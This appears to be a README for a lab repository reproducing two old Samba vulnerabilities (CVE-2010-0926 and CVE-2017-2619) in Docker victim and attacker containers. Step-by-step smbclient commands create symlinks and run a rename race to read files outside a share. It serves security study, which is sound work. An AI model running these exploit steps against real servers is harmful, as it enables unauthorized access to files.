# vulnsamba

This repo contains proof of concept exploits for 2 CVEs on old versions of samba.<br>
For each CVE, there are two docker containers: `victim` and `attacker`.





## Table of contents

* [CVE-2010-0926](#cve-2010-0926)
  * [Information and links](#information-and-links)
  * [Containers description](#containers-description)
  * [Instructions to reproduce](#instructions-to-reproduce)
* [CVE-2017-2619](#cve-2017-2619)
  * [Information and links](#information-and-links-1)
  * [Containers description](#containers-description-1)
  * [Instructions to reproduce](#instructions-to-reproduce-1)





## CVE-2010-0926


### Information and links
More on mitre: [CVE-2010-0926](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-0926)<br>
Category: [CWE-22 Path Traversal](https://cwe.mitre.org/data/definitions/22.html)<br>
Vulnerable version: `samba-3.4.5`<br>
Exploit was taken from: https://www.exploit-db.com/exploits/33599


### Containers description

* `victim` container contains `samba-3.4.5`, which was built from the sources, and configured to have two shares: `public` and `private`
* `attacker` container contains patched version of `samba-3.4.5` client, which allows creating symlinks to outside of a share


### Instructions to reproduce

1. Pull the needed images from dockerhub<br>
`docker pull kezzyhko/cve-2010-0926_victim`<br>
`docker pull kezzyhko/cve-2010-0926_attacker`

1. Run the vulnerable server<br>
`docker run -it --name cve-2010-0926_victim kezzyhko/cve-2010-0926_victim`<br>
You may see no sign of anything happening, but that's ok, `smbd` should have started working in the background

1. Find out the server container's ip<br>
`docker inspect -f '{{range.NetworkSettings.Networks}}{{.IPAddress}}{{end}}' cve-2010-0926_victim`<br>
Remember it, we will need it to connect to the server

1. Run the attacker container<br>
`docker run -it --name cve-2010-0926_attacker kezzyhko/cve-2010-0926_attacker`

1. In the attacker container, connect to the server as a guest using `smbclient`<br>
`smbclient -N \\\\<ip>\\public`<br>
Note, that `\` characters are repeated twice, because they need to be escaped

1. Create the symlink to the root (or any other folder outside share)<br>
`symlink / rootfs`

1. Finally, get the secret from the private share<br>
`cd rootfs`<br>
`cd private`<br>
`get secret.txt`<br>
`exit`<br>
`cat secret.txt`<br>
You should see the following string: `You f0und 7he s3cret!`





## CVE-2017-2619


### Information and links
More on mitre: [CVE-2017-2619](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-2619)<br>
Categories: [CWE-59 Link Following](https://cwe.mitre.org/data/definitions/59.html) and [CWE-362 Race Condition](https://cwe.mitre.org/data/definitions/362.html)<br>
Vulnerable version: `samba-4.5.2`<br>
Exploit was taken from: https://www.exploit-db.com/exploits/41740


### Containers description

* `victim` container contains:
  * `samba-4.5.2`, which was built from the sources
  * configuration to have `public` share
  * `\secret` - file inside the root directory
* `attacker` container contains patched version of `samba-4.5.2` client. Patch adds two commands to `smbclient`:
  * `rename_loop <src1> <src2> <dest>` - infinite loop, which renames `<src*>` to `<dest>` and then back, so that `<dest>` will constantly switch between being `<src1>` and `<src2>`
  * `dump <file>` - infinite loop, which constantly tries to output `<file>`'s contents and ignores errors


### Instructions to reproduce

1. Pull the needed images from dockerhub<br>
`docker pull kezzyhko/cve-2017-2619_victim`<br>
`docker pull kezzyhko/cve-2017-2619_attacker`

1. Run the vulnerable server<br>
`docker run -it --name cve-2017-2619_victim --cap-add=SYS_PTRACE --security-opt seccomp=unconfined kezzyhko/cve-2017-2619_victim`<br>
Here we need to supply additional parameters to be able to use `strace -p` later.<br>
You may see no sign of anything happening, but that's ok, `smbd` should have started working in the background.

1. Find out the server container's ip<br>
`docker inspect -f '{{range.NetworkSettings.Networks}}{{.IPAddress}}{{end}}' cve-2017-2619_victim`<br>
Remember it, we will need it to connect to the server

1. Renaming side of the attack

   1. Run the first attacker container<br>
   `docker run --rm -it --name cve-2017-2619_attacker_1 kezzyhko/cve-2017-2619_attacker`

   1. In the `attacker_1` container, create an empty file, we will need it later<br>
   `touch empty`

   1. Connect to the server as a guest using `smbclient`<br>
   `smbclient -N \\\\<ip>\\public`<br>
   Note, that `\` characters are repeated twice, because they need to be escaped

   1. Enable posix features<br>
   `posix`

   1. Create the symlink to the root directory<br>
   `symlink / link`

   1. Create the normal directory<br>
   `mkdir dir`

   1. Create the empty file inside the normal directory, and name it `secret`<br>
   `put empty dir/secret`

   1. Start the renaming loop<br>
   `rename_loop link dir switching`

1. Reading side of the attack

   1. Run the second attacker container and connect to the server<br>
   `docker run --rm -it --name cve-2017-2619_attacker_2 kezzyhko/cve-2017-2619_attacker`<br>
   `smbclient -N \\\\<ip>\\public`

   1. Inside the `attacker_2` container, start the reading loop<br>
   `dump switching/secret`<br>
   
   1. Some explanation<br>
   At this point, out `attacker_2` client is reading from `switching/secret`, which might be either `link/secret` or `dir/secret`. Theoretically, `smbd` on the `victim` container might check that reading from `switching` is ok, since it is just `dir` inside the share, but then our second attacker will change `switching` to be the `link`, and `victim` will read from `link/secret`, which is equivalent to just `/secret` outside the `public` share.<br>
   Howerver, it is not very likely for this to happen, and it may take a long time to wait. For the sake of PoC, we will slow down the `attacker_2`
   
   1. find out the pid of `smbd` proccess, which handles the `attacker_2`<br>
   For this, run `ps aux` in the `victim` container. The pid we are looking for should be the largest pid with `smbd -D` command.
   
   1. Artificially slow down the proccess<br>
   `strace -p<pid>`
   
   1. Now, look at the output in `attacker_2` process. You should see the following string: `You f0und 7he s3cret!`
